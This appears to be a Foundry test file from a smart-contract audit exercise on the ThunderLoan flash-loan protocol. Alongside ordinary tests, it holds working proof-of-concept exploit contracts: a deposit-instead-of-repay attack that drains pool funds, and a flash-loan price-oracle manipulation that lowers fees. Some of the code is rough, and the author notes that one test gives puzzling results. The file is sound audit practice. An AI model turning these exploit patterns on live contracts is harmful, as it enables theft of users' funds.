// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
import { ERC20Mock } from "../mocks/ERC20Mock.sol";
import { IFlashLoanReceiver } from "src/interfaces/IFlashLoanReceiver.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
    }

    function testRedeem() public setAllowedToken hasDeposits {
        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), DEPOSIT_AMOUNT);
        uint256 amountToRedeem = AMOUNT * 10;
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
        vm.stopPrank();

        assertNotEq(tokenA.balanceOf(address(asset)), DEPOSIT_AMOUNT - amountToRedeem);
        assertNotEq(tokenA.balanceOf(liquidityProvider), amountToRedeem);
    }

    function testRedeemAfterLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), DEPOSIT_AMOUNT);
        uint256 amountToRedeem = AMOUNT * 10;
        uint256 exchangeRate = asset.getExchangeRate();
        uint256 amountToRedeemInUnderlying = amountToRedeem * exchangeRate / asset.EXCHANGE_RATE_PRECISION();
        emit log_uint(tokenA.balanceOf(liquidityProvider));
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
        vm.stopPrank();
        emit log_uint(tokenA.balanceOf(liquidityProvider));
        emit log_uint(amountToRedeemInUnderlying);

        assertEq(tokenA.balanceOf(liquidityProvider), 100_030_000_000_000_000_000);

        // 100030000000000000000 [1e20]
        // 1000300000000000000000
        // 1000000000000000000000
        // assertEq(tokenA.balanceOf(address(asset)), DEPOSIT_AMOUNT - amountToRedeemInUnderlying);
    }

    ///@notice during a flashLoan, the receiver has to return the funds via repay; but the logic of the
    /// contract is such that it only checks the balance of teh contract after the loan is returned
    /// and teh balance of teh cotnract can be manipulated via depositing those fudns (the loan itself)
    /// and tehn redeeming the loan; thereby stealing the funds
    function testDepositOverRepay() public setAllowedToken hasDeposits {
        uint256 amountToB = 10 ether;

        DepositOverRepay dor = new DepositOverRepay(thunderLoan);
        vm.startPrank(address(dor));
        tokenA.mint(address(dor), 0.03 ether);
        thunderLoan.flashloan(address(dor), tokenA, amountToB, "");
        dor.redeem(address(tokenA), type(uint256).max);

        assert(tokenA.balanceOf(address(dor)) > amountToB + dor.s_fee());
    }

    function testOracleManipulation() public {
        address tester = address(123);
        // 1. Setup the contracts
        //tokens
        ERC20Mock tokenA = new ERC20Mock();
        ERC20Mock weth = new ERC20Mock();
        ThunderLoan thunderLoan = new ThunderLoan();
        ERC1967Proxy proxy = new ERC1967Proxy(address(thunderLoan), "");
        thunderLoan = ThunderLoan(address(proxy));
        BuffMockPoolFactory poolFactory = new BuffMockPoolFactory(address(weth));
        BuffMockTSwap tSwap = BuffMockTSwap((poolFactory.createPool(address(tokenA))));
        thunderLoan.initialize(address(poolFactory));
        AssetToken aToken = thunderLoan.setAllowedToken((tokenA), true);
        console.log("aToken", address(aToken));

        // 2. Set the oracle
        //fund a TESTER
        uint256 amount = 10_000 ether;
        tokenA.mint(tester, amount);
        weth.mint(tester, amount);

        uint256 wethToDep = 100 ether;
        uint256 tokenToDepThunder = 1000 ether;
        uint256 tokenToDep = 100 ether;
        // 1 WETH = 1 TOKEN

        vm.startPrank(tester);
        tokenA.approve(address(tSwap), type(uint256).max);
        weth.approve(address(tSwap), type(uint256).max);
        tokenA.approve(address(thunderLoan), type(uint256).max);
        weth.approve(address(thunderLoan), type(uint256).max);

        tSwap.deposit(wethToDep, 100 ether, tokenToDep, block.timestamp);
        thunderLoan.deposit(tokenA, tokenToDepThunder);
        vm.stopPrank();

        // 3. Manipulate the oracle
        //before before attack
        // take a flash loan
        TestLoanReceiever testLoanReceiever =
            new TestLoanReceiever(thunderLoan, tSwap, address(tokenA), address(weth), address(aToken));
        tokenA.mint(address(testLoanReceiever), 7000 ether);

        uint256 feeBefore = testLoanReceiever.getBeforeFees();

        vm.startPrank(address(testLoanReceiever));
        IERC20(tokenA).approve(address(tSwap), type(uint256).max);
        thunderLoan.flashloan(address(testLoanReceiever), tokenA, 50 ether, "");
        vm.stopPrank();

        uint256 attackFee = testLoanReceiever.fee1() + testLoanReceiever.fee2();
        console.log("atackFee", attackFee);

        assert(attackFee < feeBefore);
        //298603819985790278
        //518132305114515985

        //149774661992989484
        //149803782541046960

        //? why test is not bearing correct results??
    }
    //296147410319118389
    //214167600932190305
}

contract TestLoanReceiever is IFlashLoanReceiver {
    ThunderLoan public thunderLoan;
    BuffMockTSwap public tSwap;
    bool public attacked;
    uint256 public fee1;
    uint256 public fee2;
    address public tokenA;
    address public weth;
    address public repayAddr;

    constructor(ThunderLoan _thunderLoan, BuffMockTSwap _tSwap, address _tokenA, address _weth, address _repayAddr) {
        thunderLoan = _thunderLoan;
        tSwap = _tSwap;
        tokenA = _tokenA;
        weth = _weth;
        repayAddr = _repayAddr;
    }

    function getBeforeFees() public returns (uint256) {
        uint256 feeBefore = thunderLoan.getCalculatedFee(IERC20(tokenA), 100 ether);
        return feeBefore;
        console.log("feeBefore", feeBefore);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /*initiator*/
        bytes calldata /*params*/
    )
        external
        override
        returns (bool)
    {
        if (!attacked) {
            attacked = true;
            fee1 = fee;

            // swap the borrowed funds for WETH tanking the price
            // then takeout another loan and compare the fees
            uint256 wethAmt = tSwap.getOutputAmountBasedOnInput(50 ether, 1 ether, 1 ether);
            tSwap.swapPoolTokenForWethBasedOnInputPoolToken(50 ether, wethAmt, block.timestamp);

            thunderLoan.flashloan(address(this), IERC20(token), amount, "");

            IERC20(tokenA).transfer(address(repayAddr), amount + fee1);
        } else {
            fee2 = fee;

            IERC20(tokenA).transfer(address(repayAddr), amount + fee2);
        }
    }
}

contract DepositOverRepay is IFlashLoanReceiver {
    ThunderLoan public thunderLoan;
    IERC20 public s_token;
    uint256 public s_fee;

    constructor(ThunderLoan _thunderLoan) {
        thunderLoan = _thunderLoan;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /*initiator*/
        bytes calldata /*params*/
    )
        external
        override
        returns (bool)
    {
        s_token = IERC20(token);
        s_fee = fee;
        s_token.approve(address(thunderLoan), type(uint256).max);
        thunderLoan.deposit(IERC20(token), amount + fee);
        return true;
    }

    function redeem(address token, uint256 amount) public {
        thunderLoan.redeem(IERC20(token), amount);
    }
}
